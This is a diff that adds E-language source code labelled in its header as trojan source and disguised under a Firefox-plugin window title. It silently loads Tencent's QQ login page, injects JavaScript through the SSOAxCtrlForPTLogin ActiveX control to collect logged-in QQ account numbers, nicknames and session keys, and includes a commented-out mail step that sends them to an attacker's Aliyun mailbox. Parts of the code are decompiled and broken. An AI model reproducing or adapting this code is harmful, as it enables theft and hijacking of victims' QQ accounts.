@@ -1,0 +1,175 @@
+ ' 文件类型：未知类型
+
+ ' 程序名称：木马源码
+ ' 程序描述：
+ ' 程序作者：
+ ' 邮政编码：
+ ' 联系地址：
+ ' 联系电话：
+ ' 传真号码：
+ ' 电子信箱：
+ ' 主页地址：
+ ' 版权声明：
+ ' 版本号：1.0
+ ' 创建号：0.0
+
+窗口 _启动窗口 ' 在程序启动后自动调入本窗口
+    左边 = 50
+    顶边 = 50
+    宽度 = 412
+    高度 = 250
+    鼠标指针 = { 0,0,0,0 }
+    标记 = “”
+    可视 = 真
+    禁止 = 假
+    边框 = 2
+    底图方式 = 1
+    底色 = -16777216 '  0xFF000000
+    最大化按钮 = 假
+    最小化按钮 = 真
+    控制按钮 = 真
+    位置 = 1
+    可否移动 = 真
+    背景音乐播放次数 = 0
+    回车下移焦点 = 假
+    Esc键关闭 = 真
+    F1键打开帮助 = 假
+    帮助标志值 = 0
+    在任务栏中显示 = 真
+    随意移动 = 假
+    外形 = 0
+    总在最前 = 假
+    保持标题栏激活 = 假
+    窗口类名 = “”
+    底图 =  ' 空
+    图标 =  ' 空
+    背景音乐 =  ' 空
+    标题 = “火狐插件|强势回归”
+    帮助文件名 = “”
+
+
+
+.常量 key, "“document.body.innerHTML=GetuinKey();
+function GetuinKey(){var text="";var q_hummerQtrl=null;var g_vOptData=null;if(window.ActiveXObject){try{q_hummerQtrl=new ActiveXObject("SSOAxCtrlForPTLogin.SSOForPTLogin2");var A=q_hummerQtrl.CreateTXSSOData();q_hummerQtrl.InitSSOFPTCtrl(0,A);g_vOptData=q_hummerQtrl.CreateTXSSOData();var a=q_hummerQtrl.DoOperation(1,g_vOptData);var V=a.GetArray("PTALIST");var f=V.GetSize();var H=$("list_uin");for(var g=0;g<f;g++){var E=V.GetData(g);var P=E.GetDWord("dwSSO_Account_dwAccountUin");var U=E.GetStr("strSSO_Account_strNickName");var G=E.GetBuf("bufST_PTLOGIN");var A=G.GetSize();var N="";for(var Y=0;Y<A;Y++){var B=G.GetAt(Y).toString("16");if(B.length==1){B="0"+B};N+=B};text+=P+'|'+U+'|'+N+';'}}catch(b){}};return text};”", , 
+
+
+ ' 所需要的支持库：
+ ' krnln d09f2340818511d396f6aaf844c7e325 5 3 系统核心支持库
+ ' spec A512548E76954B6E92C21055517615B0 3 1 特殊功能支持库
+ ' eCompress 7B68736E818E41c5A28B0AE4D43C128C 2 0 压缩解压支持库
+
+
+
+
+数据类型 UinKey, , 
+    .成员 uin, 文本型, , , 
+    .成员 name, 文本型, , , 
+    .成员 key, 文本型, , , 
+
+.全局变量 游戏目录, 文本型, , , 
+
+.DLL命令 API_AtlAxWinInit, 整数型, "atl.dll", "AtlAxWinInit", , 
+
+.DLL命令 API_CreateWindowEx, 整数型, "user32", "CreateWindowExA", , 建立窗口
+    .参数 dwExStyle, 整数型, , 
+    .参数 lpClassName, 文本型, , 
+    .参数 lpWindowName, 文本型, , 
+    .参数 dwStyle, 整数型, , 
+    .参数 x, 整数型, , 
+    .参数 y, 整数型, , 
+    .参数 nWidth, 整数型, , 
+    .参数 nHeight, 整数型, , 
+    .参数 hWndParent, 整数型, , 
+    .参数 hMenu, 整数型, , 
+    .参数 hInstance, 整数型, , 
+    .参数 lpParam, 整数型, , 
+
+.DLL命令 API_AtlAxGetControl, 整数型, "atl.dll", "AtlAxGetControl", , 
+    .参数 h, 整数型, , 
+    .参数 x, 对象, , 
+
+.DLL命令 API_SendMessage, 整数型, "user32", "SendMessageA", 公开, 
+    .参数 窗口句柄, 整数型, , 
+    .参数 信息值, 整数型, , 
+    .参数 参数一, 整数型, , 
+    .参数 参数二, 整数型, , 
+
+.DLL命令 MultiByteToWideChar, 空白型, "", "MultiByteToWideChar", 公开, 
+    .参数 代码页, 整数型, , 
+    .参数 选项, 整数型, , 一般为0
+    .参数 ANSI字符串, 文本型, , 
+    .参数 ANSI字符串的长度, 整数型, , 如果用 -1, 就表示是用 0 作为结束符的字符串
+    .参数 unicode字符串, 字节集, , 0计算机为生成的字符串的长度
+    .参数 unicode字符串长度, 整数型, , 
+
+.DLL命令 StrToIntEx, 整数型, "shlwapi.dll", "StrToIntExA", 公开, 
+    .参数 pszString, 文本型, , 
+    .参数 dwFlags, 整数型, , 
+    .参数 piRet, 整数型, 传址, 
+
+.窗口程序集 窗口程序集_启动窗口, , , 
+
+.程序集变量 Keys, 文本型, , , 
+.程序集变量 Flags, 变体型, , , 
+.程序集变量 TargetFrameName, 变体型, , , 
+.程序集变量 PostData, 变体型, , , 
+.程序集变量 Headers, 变体型, , , 
+.子程序 KeysGetuinKeysEx, 整数型, , 
+.参数 size, 未知类型0x4102651C, 参考 可空 数组, 
+
+.局部变量 dwSize, 未知类型0x41026518, , , 
+.局部变量 hWnd, 整数型, , , 
+.局部变量 This, 对象, , , 
+.局部变量 mber, 整数型, , , 
+.局部变量 InnerText, 文本型, , "0", 
+.局部变量 dwText, 文本型, , "0", 
+.局部变量 i, 整数型, , , 
+
+.如果真 (等于 (This.创建 (“SSOAxCtrlForPTLogin.SSOForPTLogin2”, ), 假))
+    返回 (1)
+.如果真结束
+This.清除 ()
+API_AtlAxWinInit ()
+赋值 (hWnd, API_CreateWindowEx (0, “AtlAxWin”, “about:blank”, 0, 0, 0, 0, 0, 0, 0, 0, 0))
+API_AtlAxGetControl (hWnd, This)
+This.写属性 (“Silent”, 真)
+延迟 (5000)
+This.数值方法 (“Navigate”, “http://xui.ptlogin2.qq.com/cgi-bin/qlogin”, Flags, TargetFrameName, PostData, Headers)
+.循环判断首 ()
+    赋值 (mber, This.读数值属性 (“ReadyState”, ))
+    .判断开始 (等于 (mber, 0))
+        This.清除 ()
+        返回 (2)
+    .判断 (等于 (mber, 4))
+        跳出循环 ()
+    .默认
+        
+    .判断结束
+    处理事件 ()
+.循环判断尾 (真)
+This.对象型方法 (“Document”, ).读对象型属性 (“parentWindow”, ).逻辑方法 (“execScript”, #key, “JavaScript”)
+赋值 (InnerText, 分割文本 (This.对象型方法 (“Document”, ).对象型方法 (“body”, ).读文本属性 (“innerText”, ), “;”, ))
+.计次循环首 (取数组成员数 (InnerText), i)
+    赋值 (dwText, 分割文本 (InnerText [i], “|”, ))
+    .如果真 (大于或等于 (取数组成员数 (dwText), 3))
+        赋值 (.,  [1])
+        赋值 (.,  [2])
+        赋值 (.,  [3])
+         ' 加入成员 ()
+         ' Keys ＝ Keys ＋ “昵称：” ＋ dwText [2] ＋ #换行符 ＋ “账号：” ＋ dwText [1] ＋ #换行符 ＋ “密钥：” ＋ dwText [3] ＋ #换行符
+    .如果真结束
+     ' //
+.计次循环尾 ()
+赋值 (Keys, 取文本左边 (Keys, 相减 (取文本长度 (Keys), 1)))
+API_SendMessage (hWnd, 16, 0, 0)
+This.清除 ()
+ ' 发送邮件 (“办公资料查收”, Keys, “这里填写注册好的阿里云邮箱”, , “这里是留暗门的地址，推荐阿里云邮箱”, “smtp8080@aliyun.com”, “smtp8080@aliyun.com”)
+
+
+返回 (0)
+
+.子程序 __启动窗口_创建完毕, 空白型, , 
+
+
+
+ ' 不属于任何一个程序集、类模块的函数：
